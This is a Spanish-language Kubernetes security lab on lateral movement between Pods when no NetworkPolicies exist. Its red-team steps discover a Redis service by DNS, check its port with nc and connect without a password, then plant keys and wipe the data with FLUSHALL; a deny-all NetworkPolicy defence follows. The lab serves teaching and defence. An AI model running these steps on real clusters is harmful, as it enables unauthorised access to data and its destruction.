# Lab 5: Movimiento Lateral sin NetworkPolicies

## Objetivo

Demostrar como la ausencia de NetworkPolicies permite que cualquier Pod se comunique
con cualquier otro Pod en el cluster. Un atacante que compromete un Pod puede
descubrir servicios internos via DNS y acceder a bases de datos sin restriccion.

| Propiedad        | Valor                                    |
|------------------|------------------------------------------|
| **Namespace**    | `lab5-network`                           |
| **Ataque**       | DNS discovery -> Redis sin password      |
| **Defensa**      | NetworkPolicy deny-all + allow por label |
| **Dificultad**   | Intermedia                               |

---

## Requisitos

- minikube con CNI Calico para soporte de NetworkPolicies:

```bash
# IMPORTANTE: NetworkPolicies requieren un CNI que las soporte
# Iniciar minikube con Calico:
minikube start --cni=calico --memory=4096

# Verificar que Calico esta corriendo
kubectl get pods -n kube-system -l k8s-app=calico-node
# Esperar hasta que esten en estado Running

# Si ya tienes minikube sin Calico, debes recrearlo:
# minikube delete && minikube start --cni=calico --memory=4096
```

---

## Parte 1: Escenario Vulnerable (Red Team)

### Paso 1 — Desplegar el escenario sin NetworkPolicies

```bash
kubectl apply -f vulnerable-network.yaml

# Esperar a que los pods esten listos
kubectl get pods -n lab5-network -w
kubectl wait --for=condition=Ready pod/redis-vulnerable -n lab5-network --timeout=120s
kubectl wait --for=condition=Ready pod/attacker -n lab5-network --timeout=120s
```

### Paso 2 — Descubrimiento de servicios via DNS

```bash
# Entrar al pod atacante
kubectl exec -it attacker -n lab5-network -- sh

# Descubrir servicios en el namespace
nslookup redis-vulnerable.lab5-network.svc.cluster.local

# Escanear puerto de Redis
nc -zv redis-vulnerable 6379
# Resultado: open (accesible!)
```

### Paso 3 — Acceder a Redis sin autenticacion

```bash
# Dentro del pod atacante: conectar a Redis
redis-cli -h redis-vulnerable.lab5-network.svc.cluster.local

# Dentro de redis-cli:
PING
# Resultado: PONG (conectado sin password!)

KEYS *
# Ver las keys que la webapp ha creado

GET app-status
# Resultado: online

# Inyectar datos maliciosos
SET hacked "true"
SET exfil-data "sensitive-info-here"

# Borrar datos
FLUSHALL

QUIT
exit
```
## Diferencias Clave

| Aspecto              | Vulnerable                | Seguro                           |
|----------------------|---------------------------|----------------------------------|
| NetworkPolicy        | Ninguna                   | deny-all + allow selectivo       |
| Redis autenticacion  | Sin password              | `requirepass` configurado        |
| DNS discovery        | Libre                     | Solo permitido para webapp       |
| Pod-to-Pod           | Cualquiera a cualquiera   | Solo webapp -> redis             |
| Egress               | Sin restriccion           | Solo redis:6379 + DNS            |

---

## Limpieza

```bash
kubectl delete namespace lab5-network
```
